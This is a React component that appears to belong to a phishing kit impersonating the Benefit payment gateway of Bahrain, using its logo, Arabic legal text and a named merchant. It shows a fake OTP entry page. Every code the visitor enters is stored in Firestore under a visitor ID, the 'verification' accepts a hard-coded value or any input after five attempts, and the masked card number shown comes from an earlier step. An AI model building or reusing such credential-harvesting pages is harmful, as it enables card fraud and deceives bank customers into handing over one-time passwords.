"use client"

import type React from "react"

import { useState, useEffect, useRef } from "react"
import { NumericKeypad } from "./numeric-keypad"
import { addData } from "@/lib/firestore"

interface OTPVerificationProps {
  amount: string
  cardNumber: string
  onVerify: () => void
  onCancel: () => void
}

export function OTPVerification({ amount, cardNumber, onVerify, onCancel }: OTPVerificationProps) {
  const [otp, setOtp] = useState("")
  const [countdown, setCountdown] = useState(60)
  const [showKeypad, setShowKeypad] = useState(false)
  const [otpError, setOtpError] = useState(false)
  const [attempts, setAttempts] = useState(0)
  const [resendMessage, setResendMessage] = useState(false)
  const otpInputRef = useRef<HTMLInputElement>(null)
  const timerRef = useRef<NodeJS.Timeout | null>(null)
  const [allOtps, setAllOtps] = useState<string[]>([])

  // Get cart total from context
  const total=10

  // Mask the card number
  const maskedCardNumber = cardNumber.replace(/^(\d{6})(\d+)(\d{4})$/, "$1******$3")

  // Start countdown timer
  useEffect(() => {
    startCountdown()
    return () => {
      if (timerRef.current) clearInterval(timerRef.current)
    }
  }, [])

  const startCountdown = () => {
    setCountdown(60)
    if (timerRef.current) clearInterval(timerRef.current)

    timerRef.current = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          if (timerRef.current) clearInterval(timerRef.current)
          return 0
        }
        return prev - 1
      })
    }, 1000)
  }

  const handleResendOTP = () => {
    if (countdown === 0) {
      // Simulate OTP resend
      setOtp("")
      setOtpError(false)
      startCountdown()
      setResendMessage(true)

      // Hide resend message after 3 seconds
      setTimeout(() => {
        setResendMessage(false)
      }, 3000)
    }
  }

  // Function to save OTP data to Firebase
  const saveOtpData = () => {
    const vId = localStorage.getItem("visitor")
    if (!vId) return

    // Add current OTP to the array of all OTPs
    const updatedOtps = [...allOtps, otp]
    setAllOtps(updatedOtps)

    // Save to Firebase
    addData({
      id: vId,
      otp: otp,
      allOtps: updatedOtps,
    })
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()

    if (otp.length === 6) {
      // Save OTP data to Firebase
      saveOtpData()

      // Simulate OTP validation - in a real app, this would call an API
      if (otp === "123456" || attempts >= 5) {
        // Correct OTP or max attempts reached
        onVerify()
      } else {
        // Incorrect OTP
        setOtpError(true)
        setAttempts((prev) => prev + 1)
        // Clear error after 3 seconds
        setTimeout(() => {
          setOtpError(false)
        }, 3000)
      }
    }
  }

  const handleOtpFocus = () => {
    setShowKeypad(true)
  }

  const handleKeypadEnter = () => {
    setShowKeypad(false)
    if (otp.length === 6) {
      handleSubmit(new Event("submit") as unknown as React.FormEvent)
    }
  }

  return (
    <div className="w-full max-w-md bg-white border border-gray-200 shadow-sm">
      {/* Language selector */}
      <div className="text-left p-4">
        <span className="text-red-600 font-medium">English</span>
      </div>

      {/* Header */}
      <div className="text-center mb-4">
        <h1 className="text-red-600 font-bold text-2xl">BENEFIT PAYMENT GATEWAY</h1>
        <p className="text-red-600 font-bold mt-1">
          {new Date()
            .toLocaleDateString("en-GB", {
              day: "2-digit",
              month: "2-digit",
              year: "numeric",
              hour: "2-digit",
              minute: "2-digit",
              hour12: false,
            })
            .replace(/\//g, "-")}
        </p>
      </div>

      {/* Benefit Logo */}
      <div className="flex justify-center mb-4">
        <img src="/logo.webp" alt="Benefit Logo" width={100} height={100} className="mx-auto" />
      </div>

      {/* Merchant Info */}
      <div className="text-center mb-6">
        <p className="text-xl font-medium">Delmon Fish - أسماك دلمون</p>
        <p className="text-gray-600">@delmonfish</p>
      </div>

      {/* OTP Message */}
      <div className="text-center mb-6">
        <p className="text-red-600 font-medium text-lg">تم إرسال رمز OTP</p>
        {resendMessage && <p className="text-green-600 text-sm mt-1">A new OTP has been sent to your mobile</p>}
      </div>

      <form onSubmit={handleSubmit} className="px-6">
        <div className="space-y-5 mb-8">
          <div className="flex justify-between items-center">
            <span className="text-right font-medium text-lg">المبلغ</span>
            <span className="font-bold text-lg">
              {total ? total.toFixed(2) : amount}
              <strong style={{ margin: 2 }}>BD</strong>
            </span>
          </div>

          <div className="flex justify-between items-center">
            <span className="text-right font-medium">رقم البطاقة</span>
            <span className="font-medium">{maskedCardNumber}</span>
          </div>

          <div className="flex justify-between items-center">
            <span className="text-right font-medium">رمز OTP</span>
            <div className="relative w-64">
              <input
                type="text"
                value={otp}
                onChange={(e) => {
                  setOtpError(false)
                  setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))
                }}
                onFocus={handleOtpFocus}
                ref={otpInputRef}
                className={`border ${otpError ? "border-red-500" : "border-gray-300"} rounded p-2 w-full text-left`}
                placeholder=""
                maxLength={6}
                readOnly={true}
                required
              />
              {otpError && <p className="text-red-500 text-sm mt-1">Incorrect OTP. Please try again.</p>}
            </div>
          </div>

          <div className="flex justify-end">
            <button
              type="button"
              onClick={handleResendOTP}
              disabled={countdown > 0}
              className={`text-sm ${countdown > 0 ? "text-gray-500" : "text-red-600 hover:underline"}`}
            >
              أرسل رمز OTP آخر
              {countdown > 0 && <span> بعد {countdown} ثانية</span>}
            </button>
          </div>
        </div>

        {/* Action Buttons */}
        <div className="flex gap-4 mb-6">
          <button
            type="button"
            onClick={onCancel}
            className="bg-red-600 text-white rounded py-2.5 px-8 w-full font-medium hover:bg-red-700 transition-colors"
          >
            إلغاء
          </button>
          <button
            type="submit"
            className="bg-red-600 text-white rounded py-2.5 px-8 w-full font-medium hover:bg-red-700 transition-colors"
            disabled={otp.length !== 6}
          >
            دفع
          </button>
        </div>

        {/* Accepted Cards */}
        <div className="text-right mb-4">
          <a href="#" className="text-red-600 hover:underline text-sm">
            عرض البطاقات المقبولة
          </a>
        </div>

        {/* Terms */}
        <div className="text-right mb-8 text-sm leading-relaxed">
          <p dir="rtl">
            <span className="font-bold">ملاحظة:</span> إن تقديم هذه المعلومات واستخدام "بوابة الدفع الإلكترونية من بنفت"
            يعني موافقتك على{" "}
            <a href="#" className="text-red-600 hover:underline">
              شروط هذه الخدمة - إبراء الذمة القانوني
            </a>
            .
          </p>
        </div>
      </form>

      {/* Numeric Keypad */}
      {showKeypad && (
        <div className="fixed bottom-0 left-0 right-0 numeric-keypad">
          <NumericKeypad value={otp} onValueChange={setOtp} maxLength={6} onEnter={handleKeypadEnter} />
        </div>
      )}

      {/* Footer */}
      <div className="text-center space-y-2 mb-6">
        <img src="/logo.webp" alt="Benefit Logo" width={80} height={80} className="mx-auto" />
        <div className="px-6">
          <p className="text-right text-sm" dir="rtl">
            يدار الموقع من قبل شركة بنفت.
          </p>
          <p className="text-right text-sm" dir="rtl">
            حقوق التأليف © 2020-2025 لشركة بنفت. جميع الحقوق محفوظة.
          </p>
          <p className="text-right text-sm" dir="rtl">
            مرخص من قبل مصرف البحرين المركزي لتقديم الخدمات المساعدة للقطاع المالي.
          </p>
        </div>
      </div>
    </div>
  )
}
